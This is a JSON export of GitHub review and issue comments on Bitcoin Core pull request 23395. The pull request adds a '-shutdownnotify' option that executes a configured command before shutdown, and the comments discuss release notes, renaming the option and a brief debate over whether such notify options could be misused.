         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r774375371"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/774375371"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Its okay if we just mention the link to [doc/bitcoin-conf.md](https://github.com/bitcoin/bitcoin/blob/master/doc/bitcoin-conf.md) and https://github.com/bitcoin/bitcoin/pull/23850 gets merged which adds security recommendation about command line *notify options.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-12-23T07:36:33Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r774375371",
      "id" : 774375371,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584uKAfL",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 839081384,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/774375371/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-12-23T08:55:38Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/774375371",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "There are no such issues. -*notify doesn't help attackers, it helps users.",
      "created_at" : "2021-12-31T05:38:33Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1003275917",
      "id" : 1003275917,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5847zMaN",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1003275917/reactions"
      },
      "updated_at" : "2021-12-31T05:38:33Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1003275917",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> There are no such issues. -*notify doesn't help attackers, it helps users.\r\n\r\nThis is a misleading comment because a feature that helps users can always be used differently by attackers. Attackers would not ignore something because it lacks documentation or will to fix an issue.\r\n\r\nObviously 99% of the features are added in software to help users but they can be misused/abused.",
      "created_at" : "2022-01-01T19:56:23Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1003608776",
      "id" : 1003608776,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58470drI",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1003608776/reactions"
      },
      "updated_at" : "2022-01-01T19:56:23Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1003608776",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "<!--cf906140f33d8803c4a75a2196329ecb-->\nð This pull request conflicts with the target branch and [needs rebase](https://github.com/bitcoin/bitcoin/blob/master/CONTRIBUTING.md#rebasing-changes).\n\n<sub>Want to unsubscribe from rebase notifications on this pull request? Just convert this pull request to a \"draft\".</sub>",
      "created_at" : "2022-03-03T18:39:36Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1058366029",
      "id" : 1058366029,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII584_FWJN",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1058366029/reactions"
      },
      "updated_at" : "2022-03-03T18:39:36Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1058366029",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/39886733?v=4",
         "events_url" : "https://api.github.com/users/DrahtBot/events{/privacy}",
         "followers_url" : "https://api.github.com/users/DrahtBot/followers",
         "following_url" : "https://api.github.com/users/DrahtBot/following{/other_user}",
         "gists_url" : "https://api.github.com/users/DrahtBot/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/DrahtBot",
         "id" : 39886733,
         "login" : "DrahtBot",
         "node_id" : "MDQ6VXNlcjM5ODg2NzMz",
         "organizations_url" : "https://api.github.com/users/DrahtBot/orgs",
         "received_events_url" : "https://api.github.com/users/DrahtBot/received_events",
         "repos_url" : "https://api.github.com/users/DrahtBot/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/DrahtBot/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/DrahtBot/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/DrahtBot"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "<!--e57a25ab6845829454e8d69fc972939a-->\n\nThe following sections might be updated with supplementary metadata relevant to reviewers and maintainers.\n\n<!--174a7506f384e20aa4161008e828411d-->\n### Conflicts\nNo conflicts as of last run.",
      "created_at" : "2022-03-05T04:54:53Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1059686455",
      "id" : 1059686455,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII584_KYg3",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1059686455/reactions"
      },
      "updated_at" : "2022-10-06T19:08:58Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1059686455",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/39886733?v=4",
         "events_url" : "https://api.github.com/users/DrahtBot/events{/privacy}",
         "followers_url" : "https://api.github.com/users/DrahtBot/followers",
         "following_url" : "https://api.github.com/users/DrahtBot/following{/other_user}",
         "gists_url" : "https://api.github.com/users/DrahtBot/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/DrahtBot",
         "id" : 39886733,
         "login" : "DrahtBot",
         "node_id" : "MDQ6VXNlcjM5ODg2NzMz",
         "organizations_url" : "https://api.github.com/users/DrahtBot/orgs",
         "received_events_url" : "https://api.github.com/users/DrahtBot/received_events",
         "repos_url" : "https://api.github.com/users/DrahtBot/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/DrahtBot/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/DrahtBot/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/DrahtBot"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828225829"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828225829"
         }
      },
      "author_association" : "MEMBER",
      "body" : "As it is not clear that this pull will be merged quickly, maybe move the 5 lines to a separate file, per the instructions in https://github.com/bitcoin/bitcoin/blob/master/doc/developer-notes.md#release-notes ?",
      "commit_id" : "579f1a425ef8f680010b00e2b6bffa74b2acc109",
      "created_at" : "2022-03-16T16:37:39Z",
      "diff_hunk" : "@@ -57,6 +57,12 @@ Notable changes\n Example item\n ------------\n \n+New settings\n+------------\n+\n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828225829",
      "id" : 828225829,
      "line" : 64,
      "node_id" : "PRRC_kwDOABII584xXbkl",
      "original_commit_id" : "579f1a425ef8f680010b00e2b6bffa74b2acc109",
      "original_line" : 64,
      "original_position" : 8,
      "original_start_line" : 60,
      "path" : "doc/release-notes.md",
      "position" : 8,
      "pull_request_review_id" : 911951875,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828225829/reactions"
      },
      "side" : "RIGHT",
      "start_line" : 60,
      "start_side" : "RIGHT",
      "updated_at" : "2022-03-16T16:37:40Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828225829",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828226762"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828226762"
         }
      },
      "author_association" : "MEMBER",
      "body" : "Resolving this discussion for now. Let us know if there is anything left to be addressed.",
      "commit_id" : "579f1a425ef8f680010b00e2b6bffa74b2acc109",
      "created_at" : "2022-03-16T16:38:32Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828226762",
      "id" : 828226762,
      "in_reply_to_id" : 747319588,
      "line" : 65,
      "node_id" : "PRRC_kwDOABII584xXbzK",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 65,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 9,
      "pull_request_review_id" : 911953112,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828226762/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2022-03-16T16:38:33Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828226762",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828253159"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828253159"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Done ðð» ",
      "commit_id" : "fcc7cf75175769fb39d88bcb93d296e926d6913e",
      "created_at" : "2022-03-16T17:04:47Z",
      "diff_hunk" : "@@ -57,6 +57,12 @@ Notable changes\n Example item\n ------------\n \n+New settings\n+------------\n+\n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r828253159",
      "id" : 828253159,
      "in_reply_to_id" : 828225829,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584xXiPn",
      "original_commit_id" : "579f1a425ef8f680010b00e2b6bffa74b2acc109",
      "original_line" : 64,
      "original_position" : 8,
      "original_start_line" : 60,
      "path" : "doc/release-notes.md",
      "position" : null,
      "pull_request_review_id" : 911990042,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828253159/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : "RIGHT",
      "updated_at" : "2022-03-16T17:04:47Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/828253159",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "This seems like a good idea, is straightforward, and has a couple of ACKs and some concept ACKs.\r\n\r\nConcept ACK, seems it could use a functional test.",
      "created_at" : "2022-06-06T16:59:34Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1147669754",
      "id" : 1147669754,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII585EaAz6",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 1,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 1,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1147669754/reactions"
      },
      "updated_at" : "2022-06-06T16:59:34Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1147669754",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/2415484?v=4",
         "events_url" : "https://api.github.com/users/jonatack/events{/privacy}",
         "followers_url" : "https://api.github.com/users/jonatack/followers",
         "following_url" : "https://api.github.com/users/jonatack/following{/other_user}",
         "gists_url" : "https://api.github.com/users/jonatack/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/jonatack",
         "id" : 2415484,
         "login" : "jonatack",
         "node_id" : "MDQ6VXNlcjI0MTU0ODQ=",
         "organizations_url" : "https://api.github.com/users/jonatack/orgs",
         "received_events_url" : "https://api.github.com/users/jonatack/received_events",
         "repos_url" : "https://api.github.com/users/jonatack/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/jonatack/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/jonatack/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/jonatack"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r890766325"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766325"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "```suggestion\r\n    for (const auto& cmd : args.GetArgs(\"-executeonshutdown\")) {\r\n```",
      "commit_id" : "fcc7cf75175769fb39d88bcb93d296e926d6913e",
      "created_at" : "2022-06-07T04:58:20Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r890766325",
      "id" : 890766325,
      "line" : 162,
      "node_id" : "PRRC_kwDOABII5841GAP1",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 162,
      "original_position" : 8,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 8,
      "pull_request_review_id" : 997501742,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766325/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2022-06-07T05:00:43Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766325",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/94559964?v=4",
         "events_url" : "https://api.github.com/users/1440000bytes/events{/privacy}",
         "followers_url" : "https://api.github.com/users/1440000bytes/followers",
         "following_url" : "https://api.github.com/users/1440000bytes/following{/other_user}",
         "gists_url" : "https://api.github.com/users/1440000bytes/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/1440000bytes",
         "id" : 94559964,
         "login" : "1440000bytes",
         "node_id" : "U_kgDOBaLe3A",
         "organizations_url" : "https://api.github.com/users/1440000bytes/orgs",
         "received_events_url" : "https://api.github.com/users/1440000bytes/received_events",
         "repos_url" : "https://api.github.com/users/1440000bytes/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/1440000bytes/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/1440000bytes/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/1440000bytes"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r890766905"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766905"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "```suggestion\r\n    argsman.AddArg(\"-executeonshutdown=<cmd>\", \"Execute command immediately before beginning shutdown. The need for shutdown may be urgent, so be careful not to delay it long (if the command doesn't require interaction with the server, consider having it fork into the background).\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\r\n```",
      "commit_id" : "fcc7cf75175769fb39d88bcb93d296e926d6913e",
      "created_at" : "2022-06-07T04:59:38Z",
      "diff_hunk" : "@@ -405,6 +421,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command immediately before beginning shutdown. The need for shutdown may be urgent, so be careful not to delay it long (if the command doesn't require interaction with the server, consider having it fork into the background).\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r890766905",
      "id" : 890766905,
      "line" : 424,
      "node_id" : "PRRC_kwDOABII5841GAY5",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 424,
      "original_position" : 29,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 29,
      "pull_request_review_id" : 997501742,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766905/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2022-06-07T05:00:43Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/890766905",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/94559964?v=4",
         "events_url" : "https://api.github.com/users/1440000bytes/events{/privacy}",
         "followers_url" : "https://api.github.com/users/1440000bytes/followers",
         "following_url" : "https://api.github.com/users/1440000bytes/following{/other_user}",
         "gists_url" : "https://api.github.com/users/1440000bytes/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/1440000bytes",
         "id" : 94559964,
         "login" : "1440000bytes",
         "node_id" : "U_kgDOBaLe3A",
         "organizations_url" : "https://api.github.com/users/1440000bytes/orgs",
         "received_events_url" : "https://api.github.com/users/1440000bytes/received_events",
         "repos_url" : "https://api.github.com/users/1440000bytes/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/1440000bytes/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/1440000bytes/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/1440000bytes"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Are you still working on this?",
      "created_at" : "2022-10-12T18:44:38Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-1276590603",
      "id" : 1276590603,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII585MFzoL",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1276590603/reactions"
      },
      "updated_at" : "2022-10-12T18:44:38Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/1276590603",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/3782274?v=4",
         "events_url" : "https://api.github.com/users/achow101/events{/privacy}",
         "followers_url" : "https://api.github.com/users/achow101/followers",
         "following_url" : "https://api.github.com/users/achow101/following{/other_user}",
         "gists_url" : "https://api.github.com/users/achow101/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/achow101",
         "id" : 3782274,
         "login" : "achow101",
         "node_id" : "MDQ6VXNlcjM3ODIyNzQ=",
         "organizations_url" : "https://api.github.com/users/achow101/orgs",
         "received_events_url" : "https://api.github.com/users/achow101/received_events",
         "repos_url" : "https://api.github.com/users/achow101/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/achow101/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/achow101/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/achow101"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r994362164"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
